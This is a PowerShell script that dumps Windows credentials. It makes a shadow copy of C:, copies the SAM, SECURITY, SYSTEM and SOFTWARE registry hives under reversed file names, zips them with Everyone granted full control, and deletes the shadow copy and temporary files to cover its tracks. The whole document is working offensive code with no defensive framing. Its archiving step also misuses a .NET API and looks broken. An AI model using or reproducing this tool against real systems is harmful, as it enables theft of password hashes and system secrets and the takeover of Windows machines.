# zagnox
$store = "C:\Windows\Temp"

Write-Output "[+] Creating shadow copy"
# Create C: shadow copy
wmic shadowcopy call create Volume='C:\' > $null 2>&1

# Get shadow copy ID and Path
$ghostID = (vssadmin list shadows | Select-String -Pattern "Shadow Copy ID:" | Select-Object -Last 1).ToString().Split(':')[1].Trim()
$ghostPath = (vssadmin list shadows | Select-String -Pattern "Shadow Copy Volume:" | Select-Object -Last 1).ToString().Split(':')[1].Trim()

Write-Output "[*] ShadowCopy UUID: $ghostID"
Write-Output "[*] ShadowCopy Path: $ghostPath"

# Mount shadow copy
$mali = "$store\backup"
Write-Output "[+] Mounting shadow copy in $mali"
cmd /c "mklink /d $mali $ghostPath"

# Get stampas
$stampa = Get-Date -Format "yyyyMMdd_HHmmss"
$zinxho = "$store\backup_$stampa.zip"

# Copy LSA files
Write-Output "[+] Copying SAM..."
copy "$mali\windows\system32\config\sam" "$store\${stampa}_mas"
Write-Output "[+] Copying SECURITY..."
copy "$mali\windows\system32\config\security" "$store\${stampa}_ytiruces"
Write-Output "[+] Copying SYSTEM..."
copy "$mali\windows\system32\config\system" "$store\${stampa}_metsys"
Write-Output "[+] Copying SOFTWARE..."
copy "$mali\windows\system32\config\software" "$store\${stampa}_erawtfos"

# Deletes mounted folder
Write-Output "[-] Deleting symlink"
rm $mali

# Delete shadow copy
Write-Output "[-] Deleting shadow copy"
vssadmin delete shadows /Shadow="$ghostID" /Quiet > $null 2>&1

$filesToZip = @(
    "$store\${stampa}_mas",
    "$store\${stampa}_ytiruces",
    "$store\${stampa}_metsys",
    "$store\${stampa}_erawtfos"
)

Write-Output "[+] Creating ZIP archive using .NET"
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zip = [System.IO.Compression.ZipFile]::Open($zinxho, 'Create')

foreach ($file in $filesToZip) {
    if (Test-Path $file) {
        Write-Output "[+] Adding $file to archive"
        [System.IO.Compression.ZipFile]::CreateFromDirectory($file, $zip, [System.IO.Compression.CompressionLevel]::Optimal, $true)
    } else {
        Write-Output "[-] File $file not found, skipping"
    }
}
$zip.Dispose()

#
# Modify permissions to make the ZIP file readable by everyone using icacls
#Write-Output "[+] Modifying ZIP file permissions using icacls"
#$icaclsCommand = "icacls `"$zinxho`" /grant Everyone:F /T"
#Invoke-Expression $icaclsCommand

# Modify permissions to make the ZIP file readable by everyone
Write-Output "[+] Modifying ZIP file permissions"
$acl = Get-Acl $zinxho
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
$acl.SetAccessRule($accessRule)
Set-Acl -Path $zinxho -AclObject $acl

# Remove original files
Write-Output "[-] Removing extracted files"
foreach ($file in $filesToZip) {
    if (Test-Path $file) {
        Remove-Item $file -Force
    }
}

Write-Output "[+] Operation completed. Archive saved at $zinxho"